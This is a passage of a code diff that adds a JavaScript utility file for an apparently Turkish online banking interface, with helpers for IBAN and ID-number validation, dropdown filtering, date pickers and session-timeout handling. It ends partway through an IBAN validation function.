+function getComboSelectedValue(comboSelectionID) {
+    return document.getElementById(comboSelectionID).options[document.getElementById(comboSelectionID).selectedIndex].value;
+}
+
+function OpenReceipt(url) {
+    showModal(url);
+}
+
+var is_chrome = navigator.userAgent.toLowerCase().indexOf('chrome') > -1;
+var is_firefox = navigator.userAgent.toLowerCase().indexOf('firefox') > -1;
+function FcsToCtrl(e, ctrlid) {
+    if (e.keyCode == 13 || e.which == 13) {
+        if (!is_chrome) {
+            $("#" + ctrlid).get(0).focus();
+        }
+        else if (document.createEvent && window.Event) {
+            var e = document.createEvent('MouseEvents');
+            e.initEvent('click', true, true);
+            $("#" + ctrlid).each(function () { this.dispatchEvent(e); });
+        }
+    }
+}
+
+function FindInputElementsByRegex(name) {
+    var elArray = [];
+    var tmp = document.getElementsByTagName("input");
+    var regex = new RegExp(".*" + name + ".*");
+    for (var i = 0; i < tmp.length; i++) {
+
+        if (regex.test(tmp[i].name)) {
+            elArray.push(tmp[i]);
+        }
+    }
+    return elArray;
+}
+
+function toggleDiv(divId) {
+    $("#" + divId).toggle('slow');
+}
+
+function hideDiv(divId) {
+    $("#" + divId).fadeOut('slow');
+}
+function showDiv(divId) {
+    $("#" + divId).fadeIn('slow');
+}
+
+function hideDivFast(divId) {
+    $("#" + divId).fadeOut(1);
+}
+function showDivFast(divId) {
+    $("#" + divId).fadeIn(1);
+}
+
+function enableDisableDropDownList(ddlId, enable) {
+    if (enable) {
+        $("#" + ddlId).disabled = false;
+    } else {
+        $("#" + ddlId).selectedIndex = 0;
+        $("#" + ddlId).disabled = true;
+    }
+}
+
+function convertToUpperCase(e, input) {
+    if (e.keyCode > 47)
+        $(input).val(toTRUpperCase($(input).val()));
+}
+
+function toTRUpperCase(val) {
+    val = val.replace('i', 'İ');
+    return val.toUpperCase();
+}
+
+
+function removeTurkishChars(strValue) {
+    var newStrValue = strValue;
+    newStrValue = newStrValue.replace(/ğ/g, "g");
+    newStrValue = newStrValue.replace(/Ğ/g, "G");
+    newStrValue = newStrValue.replace(/ö/g, "o");
+    newStrValue = newStrValue.replace(/Ö/g, "O");
+    newStrValue = newStrValue.replace(/Ç/g, "C");
+    newStrValue = newStrValue.replace(/ç/g, "c");
+    newStrValue = newStrValue.replace(/ş/g, "s");
+    newStrValue = newStrValue.replace(/Ş/g, "S");
+    newStrValue = newStrValue.replace(/ı/g, "i");
+    newStrValue = newStrValue.replace(/İ/g, "I");
+    newStrValue = newStrValue.replace(/ü/g, "u");
+    newStrValue = newStrValue.replace(/Ü/g, "U");
+    return newStrValue;
+}
+
+function toNonTRCharsWithUpperCase(strValue) {
+    return (removeTurkishChars(toTRUpperCase(strValue)));
+}
+
+
+var whitespaceall = " \t\n\r";
+var whitespace = "\t\n\r";
+function isEmpty(s) { return ((s == null) || (s.length == 0)) }
+function isWhitespace(s) {
+    var i;
+    if (isEmpty(s)) return true
+    for (i = 0; i < s.length; i++) {
+        var c = s.charAt(i);
+        if (whitespaceall.indexOf(c) == -1)
+            return false
+    }
+    return true
+}
+function checkCharsFromList(list, data) {
+    //ikinci ksımı girip harf girmediyse
+
+    for (i = 0; i < data.length; i++) {
+        var char1 = data.charAt(i);
+        if (list.indexOf(char1) == -1) {
+            return false;
+        }
+    }
+
+    return true;
+}
+function isValidIBANValue(textBoxValue) {
+    var strIBAN = textBoxValue;
+
+    if (isWhitespace(strIBAN) || strIBAN.length > 34) {
+        return false;
+    }
+
+    if (!checkCharsFromList(letters + digits, strIBAN)) {
+        return false;
+    }
+
+    if (!checkControlDigits(strIBAN)) {
+        return false;
+    }
+    return true;
+}
+
+function isValidIBAN(textBoxId) {
+    var strIBAN = $("#" + textBoxId).val();
+
+    if (isWhitespace(strIBAN) || strIBAN.length > 34) {
+        return false;
+    }
+
+    if (!checkCharsFromList(letters + digits, strIBAN)) {
+        return false;
+    }
+
+    if (!checkControlDigits(strIBAN)) {
+        return false;
+    }
+    return true;
+}
+
+function isValidIBANTR(textBoxId) {
+    var strIBAN = $("#" + textBoxId).val();
+    if (isWhitespace(strIBAN) || strIBAN.length != 26)
+        return false;
+
+    var countryCode = strIBAN.substr(0, 2);
+    if (countryCode != 'TR')
+        return false;
+
+    var firstTwoNumbers = strIBAN.substring(2, 4);
+    if (firstTwoNumbers == 'TR')
+        return false;
+
+    if (!checkCharsFromList(letters + digits, strIBAN))
+        return false;
+
+    if (!checkControlDigits(strIBAN))
+        return false;
+
+    return true;
+}
+
+
+function VknCheckDigit(VKN) {
+
+    var x = [9, 8, 7, 6, 5, 4, 3, 2, 1, 0];
+    var y = [512, 256, 128, 64, 32, 16, 8, 4, 2, 0];
+    var Islem1 = new Array(10);
+    var Islem2 = new Array(10);
+    var Temp = 0;
+    var Temp2 = 0;
+    var Temp3 = 0;
+
+    var a = new Array(10);
+    var b = new Array(10);
+    var c = new Array(10);
+
+    var f = new Array(10);
+    if (VKN.length == 10) {
+
+        for (i = 0; i < a.length - 1; i++) {
+            f[i] = 0;
+            a[i] = parseInt(VKN.charAt(i));
+            b[i] = a[i];
+            Islem1[i] = b[i] + x[i];
+            if (Islem1[i] >= 10) {
+                Islem1[i] -= 10;
+            }
+            Islem2[i] = '' + (Islem1[i] * y[i]);
+
+
+            for (j = 0; j < Islem2[i].length; j++) {
+                c[j] = Islem2[i].charAt(j);
+                f[i] += parseInt(c[j]);
+            }
+
+            Temp = 0;
+            while (f[i] >= 10) {
+                var hedeh = f[i] + '';
+
+                for (z = 0; z < hedeh.length; z++) {
+                    Temp += parseInt(hedeh.charAt(z));
+                }
+                f[i] = Temp;
+                if (f[i] >= 10) {
+                    Temp = 0;
+                }
+            }
+            Temp2 += f[i];
+        }
+
+        Temp3 = (((parseInt((Temp2 / 10) + 1)) * 10) - Temp2) % 10;
+        a[9] = parseInt(VKN.charAt(9));
+        if (Temp3 == a[9]) {
+            return true;
+        } else {
+            return false;
+        }
+    } else {
+        return false;
+    }
+}
+
+function TcknCheckDigit(TCKN) {
+    if (TCKN.length != 11)
+        return false;
+
+    var m_tcNo = TCKN;
+    if (m_tcNo < 1)
+        return false;
+
+    var tmp1, tmp2, even_sum, odd_sum, total;
+    var chkDigit1, chkDigit2;
+    tmp1 = Math.floor(m_tcNo / 100);
+    tmp2 = Math.floor(m_tcNo / 100);
+
+    var D = new Array(9);
+
+    for (n = 8; n >= 0; n--) {
+        D[n] = tmp1 % 10;
+        tmp1 = Math.floor(tmp1 / 10);
+    }
+
+    odd_sum = D[8] + D[6] + D[4] + D[2] + D[0];
+    even_sum = D[7] + D[5] + D[3] + D[1];
+    total = odd_sum * 3 + even_sum;
+    chkDigit1 = (10 - (total % 10)) % 10;
+    odd_sum = chkDigit1 + D[7] + D[5] + D[3] + D[1];
+    even_sum = D[8] + D[6] + D[4] + D[2] + D[0];
+    total = odd_sum * 3 + even_sum;
+    chkDigit2 = (10 - (total % 10)) % 10;
+    tmp2 = tmp2 * 100 + chkDigit1 * 10 + chkDigit2;
+    if (tmp2 != m_tcNo)
+        return false;
+    else
+        return true;
+}
+
+Number.prototype.padLeft = function (width, c) {
+    if (!c) {
+        c = " ";
+    }
+
+    if (("" + this).length >= width) {
+        return "" + this;
+    }
+    else {
+        return arguments.callee.call(
+      c + this,
+      width,
+      c
+    );
+    }
+};
+function IsNumeric(data) {
+    var numbers = "0123456789";
+    for (i = 0; i < data.length; i++) {
+        var char1 = data.charAt(i);
+        if (numbers.indexOf(char1) == -1) {
+            return false;
+        }
+    }
+    return true;
+}
+
+
+
+function validPeriod(comboStartDate, comboEndDate, days) {
+
+    var startDay = document.getElementById(comboStartDate + '_cmbProcessDate0Day').options[document.getElementById(comboStartDate + '_cmbProcessDate0Day').selectedIndex].value;
+    var startMonth = document.getElementById(comboStartDate + '_cmbProcessDate0Month').options[document.getElementById(comboStartDate + '_cmbProcessDate0Month').selectedIndex].value;
+    var startYear = document.getElementById(comboStartDate + '_cmbProcessDate0Year').options[document.getElementById(comboStartDate + '_cmbProcessDate0Year').selectedIndex].value;
+    var endDay = document.getElementById(comboEndDate + '_cmbProcessDate0Day').options[document.getElementById(comboEndDate + '_cmbProcessDate0Day').selectedIndex].value;
+    var endMonth = document.getElementById(comboEndDate + '_cmbProcessDate0Month').options[document.getElementById(comboEndDate + '_cmbProcessDate0Month').selectedIndex].value;
+    var endYear = document.getElementById(comboEndDate + '_cmbProcessDate0Year').options[document.getElementById(comboEndDate + '_cmbProcessDate0Year').selectedIndex].value;
+    startdays = parseFloat(startYear) * 364 + parseFloat(startMonth) * 30 + parseFloat(startDay);
+    enddays = parseFloat(endYear) * 364 + parseFloat(endMonth) * 30 + parseFloat(endDay);
+    daydiff = enddays - startdays;
+
+    if (daydiff > parseInt(days)) {
+        return false;
+    } else {
+        return true;
+    }
+}
+
+
+function back() {
+    $$ = top.frames[0].window.$;
+
+    $$.each($$('.light-box-bg'), function () {
+        if ($$(this).is(':visible')) {
+            $lightBox = $$(this);
+            return;
+        }
+    });
+
+    if ($lightBox != null) {
+        $lightBox.veribranchLightBox('close');
+    }
+}
+
+String.prototype.toDecimal = function (defaultValue) {
+    var args = this;
+    args = args.replace(/\./g, '');
+    args = args.replace(/\,/g, '.');
+    var result = parseFloat(args);
+    if (isNaN(result) && typeof defaultValue !== "undefined") {
+        return defaultValue;
+    }
+    else {
+        return result;
+    }
+}
+
+String.prototype.toBool = function () {
+    var args = this;
+
+    if (args == undefined || args == '')
+        return false;
+    if (args.toLowerCase() == 'true')
+        return true;
+    else if (args.toLowerCase() == 'false')
+        return false;
+    else return false;
+}
+
+String.prototype.toDate = function () {
+    var args = this;
+    args = args.replace(/\./g, '/');
+    if (!IsValidDate(args)) {
+        return args;
+    }
+
+    var dateArray = args.split('/');
+    var day = parseFloat(dateArray[0]);
+    var month = parseFloat(dateArray[1]) - 1;
+    var year = parseFloat(dateArray[2]);
+
+    return new Date(year, month, day);
+}
+
+String.prototype.toMoney = function () {
+    var args = this;
+    var text = args.toString();
+
+    if (text == '')
+        return '';
+
+    if (text.indexOf('.') >= 0)
+        text = text.replace('.', '');
+
+    if (text.indexOf(',') >= 0)
+        text = text.replace(',', '.');
+
+    return text;
+}
+
+Number.prototype.toMoney = function () {
+    var args = this;
+
+    return args.toString().toMoney();
+}
+
+Date.prototype.toShortDate = function () {
+    var args = this;
+    return args.toString('dd/MM/yyyy');
+}
+
+String.prototype.format = function () {
+    var args = arguments;
+    return this.replace(/\{\{|\}\}|\{(\d+)\}/g, function (m, n) {
+        if (m == "{{") { return "{"; }
+        if (m == "}}") { return "}"; }
+        return args[n];
+    });
+};
+
+String.prototype.contains = function (it) { return this.indexOf(it) != -1; };
+
+function GetDropDownData(gridID, key) {
+    var value = $("#" + gridID).find('dd a.selected').data(key);
+    if (value == undefined) {
+        return;
+    } else {
+        return value.toString();
+    }
+}
+
+Date.prototype.ToIntegerDate = function () {
+    var d = this;
+    var curr_date = d.getDate();
+    var curr_month = d.getMonth() + 1;
+    var curr_year = d.getFullYear();
+    return curr_year + "" + curr_month.padLeft(2, '0') + "" + curr_date.padLeft(2, '0');
+};
+
+function GetDropDownDataSender(sender, key) {
+    return $(sender).data(key);
+}
+
+function GetDropDownSelectedItem(gridID) {
+    return $("#" + gridID).find('dd a.selected');
+}
+
+function GetSelectedCreditCardNumber(gridID) {
+    return GetDropDownData(gridID, 'value');
+}
+
+function changeAmountBoxCurrency(amountBoxID, currency) {
+    $('#' + amountBoxID).next('p').text(currency);
+}
+
+function FilterAndHideDropDown(dropDownID, key, filterValue) {
+    $('#' + dropDownID).find('dd li a').each(function () {
+        var $this = $(this);
+        if (key == undefined || filterValue == undefined || filterValue == "" || (Object.prototype.toString.call(filterValue) === '[object Array]' && $.inArray($this.data(key), filterValue) != -1) || $this.data(key) == filterValue) {
+            $this.parents('li')['show']();
+        } else {
+            $this.parents('li')['hide']();
+        }
+    });
+}
+function FilterDropDown(dropDownID, key, filterValue, isInverse) {
+
+    $('#' + dropDownID).find('dd li a').each(function () {
+        var $this = $(this);
+        if (key == undefined || filterValue == undefined || filterValue == "" || (Object.prototype.toString.call(filterValue) === '[object Array]' && $.inArray($this.data(key), filterValue) != -1) || $this.data(key) == filterValue) {
+            $this.parents('li')[isInverse ? 'hide' : 'show']();
+        }
+        else {
+            $this.parents('li')[isInverse ? 'show' : 'hide']();
+        }
+    });
+    setTimeout(function () {
+        var ulHeight = $('#' + dropDownID + ' .ddScroller ul').height();
+        $('#' + dropDownID + ' .ddScroller').height(ulHeight + 10).jScrollPane({ showArrows: false, verticalDragMinHeight: 20 });
+    }, 1000);
+
+}
+
+function FilterMoneyTransferDropDown(dropDownID, key, filterValue, isInverse, visibleItems, reqMessageText, clearSelectedValue) {
+
+    var list = visibleItems != null && visibleItems != undefined ? visibleItems : [];
+    var enableCheckingItemList = visibleItems != null && visibleItems != undefined && visibleItems.length > 0 ? true : false;
+    var inputValue = $('#' + dropDownID).parent().find('input');
+    var reqMessage = $(inputValue).attr('reqfieldmsg') != null && $(inputValue).attr('reqfieldmsg') != undefined && $(inputValue).attr('reqfieldmsg') != '' ? $(inputValue).attr('reqfieldmsg') : reqMessageText;
+
+    var clearAllIfEmpty = visibleItems != null && visibleItems != undefined && visibleItems.length == 0 ? true : false;
+
+
+    if (clearSelectedValue != null && clearSelectedValue != undefined && clearSelectedValue) {
+        $(inputValue).val('');
+        /**dropdowndakı uyarı mesajı gösterilir.*/
+        $('#' + dropDownID).find('dt a').first().empty();
+        if ($('#' + dropDownID).find('dt a').first().find('span') != null && $('#' + dropDownID).find('dt a').first().find('span') != undefined && $('#' + dropDownID).find('dt a').first().find('span').length == 0)
+            $('#' + dropDownID).find('dt a').first().append($('<span>').text(reqMessage));
+        else
+            $('#' + dropDownID).find('dt a').first().find('span').first().text(reqMessage);
+        /**dropdowndakı uyarı mesajı gösterilir.*/
+    }
+
+
+    $('#' + dropDownID).find('dd li a').each(function () {
+        var $this = $(this);
+        var uniqueKey = $this.data('value');
+
+        if (clearAllIfEmpty) {
+            $this.parents('li').hide();
+            return;
+        }
+
+        if (list != null && list != undefined && list.length > 0 && !list.Contains(uniqueKey) && enableCheckingItemList) {
+            $this.parents('li').hide();
+            return;
+        }
+
+        if (key == undefined || filterValue == undefined || filterValue == "" || (Object.prototype.toString.call(filterValue) === '[object Array]' && $.inArray($this.data(key), filterValue) != -1) || $this.data(key) == filterValue || $this.data(key) == undefined || $this.data(key) == null || $this.data(key) == '') {
+            if (isInverse) {
+                if (list.Contains(uniqueKey)) {
+                    $this.parents('li').hide();
+                    $this.parents('li').attr('data-actually-hidden', 'true');
+                }
+
+            }
+            else {
+                if (!list.Contains(uniqueKey))
+                    list.Add(uniqueKey);
+                $this.parents('li').show();
+                $this.parents('li').attr('data-actually-hidden', 'false');
+            }
+        }
+        else {
+            if (isInverse) {
+                if (!list.Contains(uniqueKey))
+                    list.Add(uniqueKey);
+                $this.parents('li').show();
+                $this.parents('li').attr('data-actually-hidden', 'false');
+            }
+            else {
+                if (!list.Contains(uniqueKey)) {
+                    $this.parents('li').hide();
+                    $this.parents('li').attr('data-actually-hidden', 'true');
+                }
+            }
+        }
+    });
+
+    return list;
+}
+
+function resetFilter(dropDownID) {
+    FilterDropDown(dropDownID);
+}
+
+function changeAmountAndCurrency(amountBoxID, currency, amount) {
+    var $amountBox = $('#' + amountBoxID);
+    $amountBox.next('p').text(currency);
+    $amountBox.val(amount);
+    thisBlur($amountBox[0]);
+    thisFocus($amountBox[0]);
+}
+
+function GetDatePickerDate(datePickerId) {
+    return $('#' + datePickerId).datepicker('getDate');
+}
+
+function GetDatePickerDateYMD(datePickerId) {
+    var selectedDate = GetDatePickerDate(datePickerId);
+    if (selectedDate == null) {
+        return null;
+    }
+    return selectedDate.ToIntegerDate();
+}
+
+function SetDatePickerDate(datePickerId, date) {
+    return $('#' + datePickerId).datepicker('setDate', date);
+}
+
+function isAlpha(data) {
+
+    var alphabet = /^([ABCÇDEFGĞHIİJKLMNOÖPRSŞTUÜVYZabcçdefgğhıijklmnoöprsştuüvyz]$)/;
+    return alphabet.test(data);
+}
+
+
+function resetCounter() {
+    for (var i = 0; i < top.frames.length; i++) {
+        top.frames[i].g_iCount = top.frames[i].timerCounter;
+        top.frames[i].isZiraatInvestmentSessionEnd = false;
+        top.frames[i].isResponseFetched = false;
+    }
+}
+
+function onYesClicked() {
+    resetCounter();
+    HideTimeOutPanel();
+    $.get(relativePath + "CaptchaImage.aspx?r=" + Math.random(0, 20000));
+}
+
+function onNoClicked() {
+    top.isLogOffActionStarted = true;
+    top.frames[0].isLoggingOff = true;
+    CloseChatFrame();
+    setTimeout(function () {
+        top.location.href = relativePath + "navigationcontroller.aspx?page=Logoff&r=" + Math.random(0, 20000);
+    }, 1000);
+    return;
+}
+
+
+function countDown() {
+    if ($('#TimeOutLightBox').length == 0)
+        return false;
+
+    var min = parseInt(g_iCount / 60);
+    var sec = g_iCount - min * 60;
+    if (g_iCount == 60) {
+        //***END JS***//   
+        if (!isResponseFetched) {
+            CheckForZiraatInvestmentLoginStatus(CheckForZiraatInvestmentLoginStatusCallBack);
+            setTimeout('countDown()', 1000);
+            return;
+        }
+
+        if (reTryCount == 0) {//oturum uzatma hakkı dolan kullanıcı logoff edılır
+            StartLoggOff();
+            return;
+        }
+
+        if (!isResponseFetched && reTryCount > 0) {
+            setTimeout('countDown()', 1000);
+            return;
+        }
+
+        if (isZiraatInvestmentSessionEnd && reTryCount > 0) {
+            ShowTimeOutPanel();
+            VeriBranch.SetIframeLightBox();
+            $(".global-count:not(.global-f-count) h5").html(g_iCount);
+        }
+
+    }
+    else if (g_iCount < 60 && g_iCount > 0) {
+        $(".global-count:not(.global-f-count) h5").html(g_iCount);
+    }
+
+    if (g_iCount > 0) {
+        $('#timeoutCounter')[0].innerHTML = (min < 10 ? '0' : '') + min + ':' + (sec < 10 ? '0' : '') + sec;
+        //        $('#extraTime .counter')[0].innerHTML = g_iCount;
+        setTimeout('countDown()', 1000);
+    }
+    else if (g_iCount == 0 && !top.frames[0].isLoggingOff) {
+        StartLoggOff();
+
+
+        return;
+    }
+    else {
+        return;
+    }
+    g_iCount -= 1;
+}
+
+var fTimeoutShowedOnce = false;
+
+function fCountDown(maxTimeoutWarningSeconds, maxTimeoutStopWorkingSeconds, showWarningMessage) {
+    if ($('#FTimeOutLightBox').length == 0)
+        return false;
+
+    var loadingPanelVisible = window.top.$(".loadingPanel").is(":visible");
+
+    if (fTimeOutCount == 0 && !top.frames[0].isLoggingOff) {
+        //$.get(relativePath + 'Transactions/Login/LogoutHandler.ashx', function (Response) {
+        StartLoggOff();
+        //});
+        return;
+    }
+    else if (fTimeOutCount <= maxTimeoutStopWorkingSeconds) {
+        if (!loadingPanelVisible) {
+            if (!$('#FTimeOutLightBox').is(':visible')) {
+                ShowFTimeOutPanel();
+                $("#FTimeOutLightBox").veribranchLightBox("setIframeLightBox")
+                //VeriBranch.SetIframeLightBox();
+            }
+
+            $('#TimeoutPanelOkButton').hide();
+            $('.f-timeout-message').hide();
+            $('.f-countdown').show();
+            $(".global-f-count h5").show();
+            $(".global-f-count h5").html(fTimeOutCount);
+            $(".global-f-count > div").css('width', '289px');
+        }
+    }
+    else if (fTimeOutCount <= maxTimeoutWarningSeconds) {
+        //***END JS***//
+        if (!loadingPanelVisible) {
+            if (!$('#FTimeOutLightBox').is(':visible') && showWarningMessage && !fTimeoutShowedOnce) {
+                ShowFTimeOutPanel();
+                $("#FTimeOutLightBox").veribranchLightBox("setIframeLightBox")
+                //VeriBranch.SetIframeLightBox();
+                fTimeoutShowedOnce = true;
+            }
+
+            $('#TimeoutPanelOkButton').show();
+            $('.f-timeout-message').show();
+            $('.f-countdown').hide();
+            $(".global-f-count h5").hide();
+            $(".global-f-count > div").css('width', '370px');
+        }
+    }
+
+    fTimeOutCount -= 1;
+    setTimeout(function () {
+        fCountDown(maxTimeoutWarningSeconds, maxTimeoutStopWorkingSeconds, showWarningMessage);
+    }, 1000);
+}
+
+function onFTimeOutClick() {
+    HideFTimeOutPanel();
+    $.get(relativePath + 'Controls/Handlers/SessionTimeoutHandler.ashx'.AddRandomQueryParameter(), function (res) { });
+}
+
+function IsFutureDate(givenDate) {
+
+    /* example
+    var today = Date.today();
+    var past = Date.today().add(-6).days();
+    var future = Date.today().add(6).days();
+
+
+    Date.compare(today, future);                    // -1
+    Date.compare(today, new Date().clearTime());    // 0
+    Date.compare(today, past)                       // 1
+    
+    */
+
+    var today = Date.today();
+    if (givenDate == null || givenDate == undefined)
+        return false;
+
+    var result = Date.compare(today, givenDate);
+
+    if (result == -1)
+        return true;
+    else
+        return false;
+
+}
+
+function VPPickerRangeValid($picker, dateText) {
+    var msg;
+    var selectedDate = dateText.toDate();
+    var validMinDate = $picker.datepicker('option', 'minDate');
+    var validMaxDate = $picker.datepicker('option', 'maxDate');
+
+    var minResult = Date.compare(selectedDate, validMinDate);
+    var maxResult = Date.compare(selectedDate, validMaxDate);
+
+    if (minResult == -1 || maxResult == 1) {
+        msg = $picker.attr('DateRangeMsg');
+        msg = msg.format(validMinDate.toShortDate(), validMaxDate.toShortDate());
+    }
+
+    return msg;
+}
+
+function VBPickerValid($picker, i, rules) {
+    var dateText = $picker.val(),
+        msg = undefined,
+        hasError = false;
+
+    if ($picker.attr('ReqFieldMsg') != undefined && (dateText.length == 0 || dateText == "")) {
+        msg = $picker.attr('ReqFieldMsg');
+    }
+    else if ($picker.attr('ExValidMethod')) {
+        if ($picker.attr('ExValidMethod')) {
+            var externalMethod = $picker.attr('ExValidMethod');
+
+            if (externalMethod != undefined) {
+                fun = eval(externalMethod);
+                msg = fun($picker);
+            }
+        }
+    }
+    else {
+
+        if (msg == undefined && !IsValidDate(dateText)) {
+            msg = $picker.attr('invaliddatemsg');
+        }
+
+        if (msg == undefined) {
+            msg = VPPickerRangeValid($picker, dateText);
+        }
+    }
+
+
+
+    if (msg != undefined) {
+        $picker.val('');
+        return GetValidationMsg($picker, msg);
+    }
+}
+
+
+function showElement(elementId) {
+    $('#' + elementId).show();
+}
+
+function hideElement(elementId) {
+    $('#' + elementId).hide();
+}
+
+function isAlphaUpperOrNumber(data) {
+    //ikinci ksımı girip harf girmediyse
+    var alphabet = "ABCÇDEFGĞHIİJKLMNOÖPRSŞTUÜVXYZ1234567890\\/-";
+    return checkCharsFromList(alphabet, data);
+}
+
+function isValidEmail(value) {
+    //var email = new RegExp("^.+@.+\\..+$");
+    var email = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+    return email.test(value);
+}
+
+function isValidPhone(value) {
+    var number = new RegExp("^[0-9]{10}$");
+    return number.test(value);
+}
+
+function isValidPhoneNumber(value) {
+    var number = new RegExp("^0[1-9]{1}[0-9]{9}$");
+    return number.test(value);
+}
+
+function isValidSMSNumber(value) {
+    var r = new RegExp("^[5][0-9]{9}$");
+    return r.test(value);
+}
+
+function IsNumeric(data) {
+    var numbers = "0123456789";
+    for (i = 0; i < data.length; i++) {
+        var char1 = data.charAt(i);
+        if (numbers.indexOf(char1) == -1) {
+            return false;
+        }
+    }
+    return true;
+}
+
+function IsAlphaNumeric(data) {
+    var alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    var numbers = "0123456789";
+
+    return !checkCharsFromList(alphabet, data) && !checkCharsFromList(numbers, data);
+}
+
+
+
+function isNumeric(data) {
+    var alphabet = "0123456789";
+    return checkCharsFromList(alphabet, data);
+}
+
+function checkCharsFromList(list, data) {
+    //ikinci ksımı girip harf girmediyse
+
+    for (i = 0; i < data.length; i++) {
+        var char1 = data.charAt(i);
+        if (list.indexOf(char1) == -1) {
+            return false;
+        }
+    }
+
+    return true;
+}
+
+
+function checkPassword(data) {
+
+    var alphabet = "ABCÇDEFGĞHIİJKLMNOÖPRSŞTUÜVYZabcçdefgğhıijklmnoöprsştuüvyz";
+    var number = "0123456789";
+    var alphabet_count = 0;
+    var number_count = 0;
+
+    for (i = 0; i < data.length; i++) {
+
+        var char1 = data.charAt(i);
+        if (alphabet.indexOf(char1) != -1) {
+            alphabet_count = alphabet_count + 1;
+        }
+
+        if (number.indexOf(char1) != -1) {
+            number_count = number_count + 1;
+        }
+    }
+
+    if (number_count >= 2 && alphabet_count >= 2)
+        return true;
+    else
+        return false;
+
+}
+
+function ExpandiFrameBy(val, frameId) {
+    var iframeH11 = $(parent.window.document.getElementById('mainFrame')).height();
+    $(parent.window.document.getElementById('mainFrame')).height(iframeH11 + val);
+    $(parent.parent.window.document.getElementById(frameId)).height(iframeH11 + val);
+    $('#mainFrame').attr('allowtransparency', 'true');
+    $(".ddScroller, .jspContainer").height(iframeH11 + val);
+}
+
+function ShrinkiFrameBy(val, frameId) {
+    var iframeH22 = $(parent.window.document.getElementById('mainFrame')).height();
+    $(parent.window.document.getElementById('mainFrame')).height(iframeH22 - val);
+    $(parent.parent.window.document.getElementById(frameId)).height(iframeH22 - val);
+    $('#mainFrame').attr('allowtransparency', 'true');
+    $(".ddScroller, .jspContainer").height(iframeH22 - val);
+}
+function HideHiddenValidation(selectorID) {
+    $('#' + selectorID).parent().find('.formError').fadeOut('fast', function () { $(this).remove() });
+}
+
+function CalculateGold(path, tradingType, fxAmount, fxCurrency, goldAmount, callBackFunction) {
+    $.getJSON(path + 'Transactions/Trading/Gold/GoldCalculator.ashx',
+    {
+        t: tradingType,
+        fxA: fxAmount,
+        fxC: fxCurrency,
+        gA: goldAmount,
+        r: Math.random(0, 20000)
+    },
+    function (response) {
+        callBackFunction(response);
+    });
+}
+
+function enableBtn(BtnId) {
+
+    $('#' + BtnId).removeClass('switch-disabled');
+
+    var $onClick = $('#' + BtnId).attr("onclick");
+    if ($onClick.indexOf("return false;") === 0) {
+        $('#' + BtnId).attr("onclick", $onClick.replace("return false;", ""));
+    }
+}
+
+function disableBtn(BtnId) {
+
+    $('#' + BtnId).addClass('switch-disabled');
+
+    var $onClick = $('#' + BtnId).attr("onclick");
+
+    if ($onClick == undefined || $onClick.indexOf("return false;") != 0) {
+
+        $('#' + BtnId).attr("onclick", "return false;" + $onClick);
+
+    }
+}
+
+function disableRadioBtn(element) {
+    element.disabled = true;
+    setTimeout(function () {
+        $(element).parent().next("label").addClass("disabled-radio");
+    }, 10);
+}
+
+function enableRadioBtn(element) {
+    element.disabled = false;
+    $(element).parent().next("label").removeClass("disabled-radio");
+}
+
+function CheckDescription(evt) {
+    var charCode = (evt.which) ? evt.which : event.keyCode;
+    var target = $(evt.target);
+    var invalidChars;
+
+    if (target != undefined) {
+        invalidChars = $(target).data('invalidchars');
+        if (IsInvalidChar(String.fromCharCode(charCode), invalidChars))
+            return false;
+    }
+    return IsValidCharacterCode(charCode);
+}
+
+
+function IsInvalidChar(chr, invalidChars) {
+    if (invalidChars != undefined && invalidChars != '') {
+        for (i = 0; i < invalidChars.length; i++) {
+            if (chr == invalidChars[i])
+                return true;
+        }
+    }
+    return false;
+}
+
+function GetCharacterCode(value) {
+    return value.charCodeAt(0);
+}
+
+function IsValidCharacterCode(charCode) {
+
+    //    if ((charCode > 64 && charCode < 91)
+    //    || (charCode > 96 && charCode < 123)
+    //    || (charCode > 47 && charCode < 58)
+    //    || (charCode == 95)
+    //    || /*for space*/(charCode == 32)
+    //    || /*for non breaking space*/(charCode == 160)
+    //    || /*for back space*/(charCode == 8)
+    //    || /*for (*/(charCode == 40)
+    //    || /*for )*/(charCode == 41)
+    //    || /*for +*/(charCode == 43)
+    //    || /*for ,*/(charCode == 44)
+    //    || /*for -*/(charCode == 45)
+    //    || /*for .*/(charCode == 46)
+    //    || /*for :*/(charCode == 58)
+    //    || /*for ;*/(charCode == 59)
+    //    || /*for turkish characters*/isAlpha(String.fromCharCode(charCode))) return true;
+
+    if (charCode == 38 || charCode == 60) return false;
+    return true;
+}
+
+function CheckGivenText(element, invalidTextMessage) {
+
+    var charArray = $(element).val();
+    var msg = $(element).attr('InvalidCharacterMsg');
+
+    if (msg == undefined || msg == '')
+        msg = 'Lütfen geçerli karakter giriniz.';
+
+    if ($(element).hasClass('have-value')) {
+        for (i = 0; i < charArray.length; i++) {
+            var charCode = GetCharacterCode(charArray.charAt(i));
+            if (!IsValidCharacterCode(charCode))
+                return msg;
+        }
+    }
+}
+
+
+String.prototype.ReplaceSpaceWith = function (replaceWith) {
+    var args = this;
+    return args.replace(/\s/g, replaceWith);
+};
+
+String.prototype.ReplaceDashWith = function (replaceWith) {
+    var args = this;
+    return args.replace(/-/g, replaceWith);
+};
+
+
+
+String.prototype.bool = function () {
+    return (/^true$/i).test(this);
+};
+
+
+function CalculateIban(branchCodeVal, customerNoVal, accountNoVal) {
+
+    try {
+        var tmpIBAN = "TR00" + "00" + "00010" + "0" + padLeft(branchCodeVal.toString(), "0", 4) + padLeft(customerNoVal.toString() + accountNoVal.toString(), "0", 12);
+        tmpIBAN = prepareToCalcControlDigits(tmpIBAN)
+        var checkDigit = 98 - mod97(tmpIBAN);
+        checkDigit = padLeft(checkDigit.toString(), "0", 2);
+        var strIBAN = "TR" + checkDigit + "00010" + "0" + padLeft(branchCodeVal.toString(), "0", 4) + padLeft(customerNoVal.toString() + accountNoVal.toString(), "0", 12);
+
+        return strIBAN;
+    } catch (e) {
+        alertMSG("IBAN numarası hesaplanamadı, lütfen girdiğiniz değerleri kontrol ediniz.");
+        return "";
+    }
+}
+
+function GetGridViewSelectedItem(id) {
+    return $($('#' + id).find('.ez-selected input')[0]);
+}
+
+function GetGridSelectedRadio(selector) {
+    return $(selector).find('input:checked');
+}
+
+function GetGridViewSelectedItemAttr(id, key) {
+    return GetGridViewSelectedItem(id).attr(key);
+}
+
+function OzIsValidIban(iban) {
+
+    if (iban == '' || iban == undefined)
+        return false;
+
